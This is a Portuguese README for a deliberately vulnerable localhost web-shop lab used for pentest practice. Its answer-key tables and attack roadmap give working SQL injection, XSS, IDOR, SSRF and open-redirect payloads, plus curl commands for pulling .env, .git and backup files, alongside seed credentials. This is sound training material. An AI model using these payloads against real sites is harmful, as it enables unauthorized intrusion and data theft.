# Lab 01 — VulnShop

> ⚠️ **VULNERÁVEL DE PROPÓSITO — TREINO SOMENTE EM LOCALHOST.**
> Esta aplicação planta bugs reais e exploráveis de propósito. Nunca a exponha a
> uma rede, nunca a rode em um host público ou compartilhado, e nunca reaproveite
> nenhuma das credenciais de semente. Ela escuta em `127.0.0.1` por um motivo.

## O que é

O **VulnShop** é um site de comércio eletrônico falso ("a loja no fim do
universo") usado para praticar o fluxo completo de pentest: descoberta de
conteúdo e reconhecimento → auditoria passiva de cabeçalhos → exploração ativa. É
um **arquivo Python único e autocontido** que usa apenas a biblioteca padrão
(`http.server` + `sqlite3` + `urllib`) — sem Flask, sem pip install. Os dados
ficam em um banco SQLite em memória, populado na inicialização (`users`,
`products`, `orders`, `comments`).

A página inicial aponta para as páginas principais, para um crawler ou
ferramenta de descoberta de conteúdo achá-las, e o `/robots.txt` vaza uma pista
para `/secret-admin`.

## Como rodar

```bash
python app.py
```

Depois acesse **http://127.0.0.1:18801**. Pare com `Ctrl+C`.
Sem argumentos, sem configuração, sem dependências. Exige Python 3.8 ou superior.

## Credenciais de semente (para referência)

| username | password           | role     |
|----------|--------------------|----------|
| admin    | `S3cr3tAdminP@ss`  | admin    |
| alice    | `alice123`         | customer |
| bob      | `bobpassword`      | customer |
| carol    | `letmein2024`      | customer |

(Você não deveria *precisar* delas — o objetivo é entrar sem elas.)

## Vulnerabilidades plantadas

Gabarito: [`gabarito.json`](gabarito.json). Cada vulnerabilidade vale 1 ponto.

### Etapa de reconhecimento (descobrível por crawler + auditoria passiva de cabeçalhos)

| ID  | Classe       | Sev      | Rota              | Como explorar |
|-----|--------------|----------|-------------------|----------------|
| V01 | scm          | high     | `/.git/config`    | `git-dumper http://127.0.0.1:18801/.git/ loot` ou `curl /.git/config` (também `/.git/HEAD`). |
| V02 | creds        | critical | `/.env`           | `curl /.env` → `DB_PASSWORD`, `SECRET_KEY`, `STRIPE_KEY=sk_live_...`, `JWT_SECRET`. |
| V03 | backup       | high     | `/backup.sql`     | `curl /backup.sql` → dump SQL com senhas de usuário em texto plano e hashes legados. |
| V04 | dir-listing  | medium   | `/uploads/`       | `curl /uploads/` → listagem estilo Apache "Index of /uploads" com `db_dump.sql`, faturas e `users_export.csv`. |
| V05 | headers      | low      | `/` (todas)       | `curl -I /` → sem `X-Frame-Options` / `CSP` / `X-Content-Type-Options` / `HSTS` (clickjacking + auditoria de cabeçalhos). |
| V06 | cookie       | medium   | `/login`          | Um login bem-sucedido define o cookie `session=...` **sem** `HttpOnly` / `Secure` / `SameSite`. |
| V07 | info-disc    | medium   | `/product?id=abc` | Qualquer erro não tratado ou entrada inválida devolve um traceback completo do Python ou o erro bruto do SQL no corpo. |
| V08 | admin-panel  | high     | `/admin`          | `curl /admin` → lista de usuários, sem autenticação. Pista: `/robots.txt` → `/secret-admin`. |

### Etapa de exploração (ativa)

| ID  | Classe        | Sev      | Rota              | Como explorar |
|-----|---------------|----------|-------------------|----------------|
| V09 | sqli          | critical | `/login` (POST)   | `curl -i -d "username=' OR '1'='1' -- &password=x" /login` → **302** `/dashboard` + `Set-Cookie`. |
| V10 | sqli          | high     | `/product?id=1`   | `id=1 AND 1=2` → vazio; `id=1'` → erro verboso do sqlite. Injetável por UNION (`id=0 UNION SELECT 1,username,3,password FROM users`). |
| V11 | xss           | medium   | `/search?q=`      | `curl '/search?q=<script>alert(1)</script>'` → refletido sem codificação. |
| V12 | stored-xss    | high     | `/comment` (POST) | Envie um comentário com corpo `<script>...</script>`; ele persiste e dispara para todo visitante de `/comments`. |
| V13 | idor          | high     | `/api/order?id=1` | Itere `id=1..5` (também `/api/order/<id>`) → pedido de qualquer usuário, sem verificação de propriedade. |
| V14 | open-redirect | low      | `/redirect?url=`  | `curl -i '/redirect?url=https://evil.example.com'` → 302 para a URL do atacante. |
| V15 | ssrf          | high     | `/fetch?url=`     | `curl '/fetch?url=http://127.0.0.1:18801/.env'` → o servidor busca a URL e devolve o corpo (só http/https). |

## Roteiro sugerido de ataque

1. **Reconhecimento:** varra `/`, leia `/robots.txt`, pegue `/.git/config`,
   `/.env`, `/backup.sql`, liste `/uploads/`. Auditoria passiva com `curl -I /`
   para cabeçalhos ausentes. Agora você tem credenciais e inteligência do
   controle de versão.
2. **Desvio de autenticação:** `' OR '1'='1' -- ` no `/login` → dashboard +
   cookie inseguro (V06).
3. **Exfiltração de dados:** SQLi por UNION em `/product?id=` (V10) para despejar
   `users`; IDOR em `/api/order` (V13) para ler todos os pedidos.
4. **Lado do cliente:** XSS refletido em `/search` (V11), XSS armazenado em
   `/comments` (V12).
5. **Alcance no servidor:** SSRF em `/fetch` (V15) para puxar recursos internos;
   redirecionamento aberto em `/redirect` (V14) para cadeias de phishing.

## Notas / projeto

- SQLite em memória, populado do zero a cada início — reinicie para redefinir o
  estado (por exemplo, depois de plantar comentários de XSS armazenado).
- O servidor é multithread e envolve os handlers para **nunca travar** — exceto o
  caminho *intencional* de traceback verboso (V07), que é o bug.
- O cabeçalho `Server:` é falsificado como `Apache/2.4.41 (Ubuntu)` para tornar a
  listagem de diretório estilo Apache convincente.
